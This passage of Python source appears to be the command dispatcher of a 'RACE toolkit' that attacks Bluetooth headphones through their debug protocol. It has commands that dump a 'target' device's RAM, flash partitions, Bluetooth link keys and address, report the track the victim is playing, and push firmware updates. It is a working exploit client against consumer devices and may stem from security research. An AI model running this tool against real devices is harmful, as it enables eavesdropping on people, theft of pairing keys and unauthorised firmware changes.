        t = await _read_media_attr(dumper, 0x14238C98)
        al = await _read_media_attr(dumper, 0x14238CA0)
        ar = await _read_media_attr(dumper, 0x14238C88)
        gen = await _read_media_attr(dumper, 0x14238CA4)
        logging.info("Your target is currently listening to:")
        logging.info("\tTrack: %s", t)
        logging.info("\tAlbum: %s", al)
        logging.info("\tArtist: %s", ar)
        logging.info("\tGenre: %s", gen)
    elif (
        bv
        == "mt2822x_evkMT2822_SDK_Sony-ER69_mdr14_c42sp_12024/06/28 13:44:31 GMT +08:00"
    ):  # v1.0.9
        # each field is prepended with 0x02 0xLL where LL is the length of the string
        # but to be faster we just dump 0x100 bytes and do the parsing afterwards, hoping we
        # dumped enough
        data = await dumper.dump(0x14238DB0, 0x100)
        parts = data.split(b"\x02")[1:5]
        m = ["Track", "Album", "Artist", "Genre"]
        logging.info("Your target is currently listening to:")
        for i, part in enumerate(parts):
            plen = part[0]
            logging.info("\t%s: %s", m[i], part[1: plen + 1].decode('utf8'))
            if len(part) > plen + 1 and part[plen + 1] == 0x01:
                break
    else:
        logging.error(
            "Sorry, we don't know this buildversion. We don't support unknown versions."
        )


async def command_dump_partition(r: RACE, outfile: str):
    """Interactively choose and dump a partition from the target device."""
    # dumping a whole partion to stdout is kinda stupid, so lets not do it
    if not outfile:
        logging.error(
            "Please specify an outfile to dump the NVDM partition to.")
        sys.exit(1)

    logging.info("Reading partition table:")
    pt_dumper = RACEFlashDumper(r, 0x0, 0x1000)
    pt = await pt_dumper.dump()

    partitions = parse_partition_table(pt)
    logging.info("\nPartition Table")
    logging.info("===================")
    for idx, (addr, size, ptype) in enumerate(partitions):
        logging.info(
            "Partition %2d: Address = 0x%08X, Length = 0x%08X, Type = %s",
            idx, addr, size, ptype
        )
    logging.info(
        "\n\x1b[3mHint: The NVDM partition is usually in partition 6\x1b[0m\n")

    chosen = -1
    while chosen >= len(partitions) or chosen < 0:
        chosen = int(input("Which partition would you like to dump?\n"))

    ptaddr, ptsize, _ = partitions[chosen]
    logging.info("Dumping partition %d at 0x%08X", chosen, ptaddr)

    dumper = RACEFlashDumper(r, ptaddr, ptsize)
    if outfile:
        with open(outfile, "wb") as f:
            await dumper.dump(fd=f)
    else:
        outbuf = await dumper.dump()
        hexdump(outbuf)


async def command_fota(
    r: RACE, fota_file: str, dont_reflash: bool, chunks_per_write: int
):
    """Perform FOTA (Firmware Over The Air) update on the target device."""
    f = FOTAUpdater(r, chunks_per_write)
    if fota_file is None and dont_reflash is False:
        logging.error(
            "FOTA File is required when --dont-reflash is not set!"
        )
        return
    # Invert the dont_reflash flag so that it's clearer in the FOTA updater class
    await f.update(fota_file, not dont_reflash)


async def main():
    """Main entry point for the RACE toolkit."""
    # Parse arguments and commands
    args = parse_args()

    setup_logging(args.debug)

    # Commands that don't need RACE transport
    if args.command == "check":
        await command_check(args)
        return
    if args.command == "enumerate-classic":
        await command_enumerate_classic(args)
        return

    # Initialize the transport class based on the given technology and target UUIDs
    transport = None
    try:
        transport = init_transport(args)
    except ValueError as e:
        logging.error("Transport could not be initialized: %s", e)
        return

    r = None
    try:
        r = RACE(transport, args.send_delay)
        if args.command == "ram":
            await command_ram(r, args.address, args.size, args.outfile, args.debug)
        elif args.command == "raw":
            # args.id is fine, it's not a builtin shadow
            await command_raw(r, args.id, args.outfile)
        elif args.command == "flash":
            await command_flash(
                r, args.address, args.size, args.outfile, args.debug
            )
        elif args.command == "link-keys":
            await command_link_keys(r, args.outfile)
        elif args.command == "bdaddr":
            await command_bdaddr(r, args.outfile)
        elif args.command == "sdkinfo":
            await command_sdkinfo(r, args.outfile)
        elif args.command == "buildversion":
            await command_buildversion(r, args.outfile)
        elif args.command == "mediainfo":
            await command_mediainfo(r)
        elif args.command == "enumerate-race":
            await command_enumerate_race(r)
        elif args.command == "dump-partition":
            await command_dump_partition(r, args.outfile)
        elif args.command == "fota":
            await command_fota(
                r, args.fota_file, args.dont_reflash, args.chunks_per_write
            )
    except ConnectionError as e:
        logging.error("Connection failed: %s", e)
        # Offer to try alternative transport if using GATT
        if args.transport.lower() == "gatt" and args.target_address:
            logging.info(
                "Tip: Your device may use Bluetooth Classic. "
                "Try: --transport rfcomm --target-address %s",
                args.target_address
            )
        elif args.transport.lower() == "gatt" and not args.target_address:
            await _offer_transport_fallback(args, r)
    finally:
        if r is not None:
            await r.close()


async def _offer_transport_fallback(
    args: argparse.Namespace, current_race: RACE | None
):
    """Offer to try RFCOMM transport when GATT fails."""
    logging.info(
        "\nWould you like to try Bluetooth Classic (RFCOMM) instead? [y/N]: "
    )
    response = input().strip().lower()
    if response in ("y", "yes"):
        logging.info(
            "Please enter the Bluetooth Classic address (e.g., AA:BB:CC:DD:EE:FF):")
        bt_addr = input().strip()
        if bt_addr:
            # Close the current connection if any
            if current_race is not None:
                await current_race.close()

            # Try RFCOMM
            logging.info("Attempting RFCOMM connection to %s...", bt_addr)
            release_bluetooth_controller(args.controller)
            rfcomm_transport = RFCOMMTransport(
                args.controller, bt_addr, args.authenticate
            )
            r = RACE(rfcomm_transport, args.send_delay)
            try:
                # Re-run the command with new transport
                if args.command == "mediainfo":
                    await command_mediainfo(r)
                elif args.command == "buildversion":
                    await command_buildversion(r, args.outfile)
                elif args.command == "sdkinfo":
                    await command_sdkinfo(r, args.outfile)
                elif args.command == "bdaddr":
                    await command_bdaddr(r, args.outfile)
                else:
                    logging.info(
                        "Please re-run the command with --transport rfcomm --target-address %s",
                        bt_addr
                    )
            finally:
                await r.close()


def run_main():
    """Run main with proper exception handling."""
    # Check debug flag early for exception handling display
    debug_mode = "--debug" in sys.argv

    try:
        asyncio.run(main())
    except asyncio.CancelledError:
        # Task was cancelled, usually due to connection issues
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        logging.error(
            "Operation was cancelled. The connection may have been lost."
        )
        sys.exit(1)
    except asyncio.TimeoutError as e:
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        msg = str(e) if str(e) else "Operation timed out."
        logging.error("%s", msg)
        sys.exit(1)
    except ConnectionError as e:
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        logging.error("Connection error: %s", e)
        sys.exit(1)
    except USBErrorBusy:
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        logging.error(
            "USB device is busy. The Bluetooth controller may still be in use. "
            "Try unplugging and replugging the adapter, or run: "
            "sudo systemctl stop bluetooth"
        )
        sys.exit(1)
    except KeyboardInterrupt:
        logging.info("Interrupted by user.")
        sys.exit(130)
    except (OSError, IOError, RuntimeError, ValueError) as e:
        # Catch common runtime errors that may bubble up
        if debug_mode:
            logging.debug("Traceback:\n%s", traceback.format_exc())
        logging.error("Error: %s", e)
        if not debug_mode:
            logging.info("Run with --debug for full traceback.")
        sys.exit(1)


if __name__ == "__main__":
    run_main()
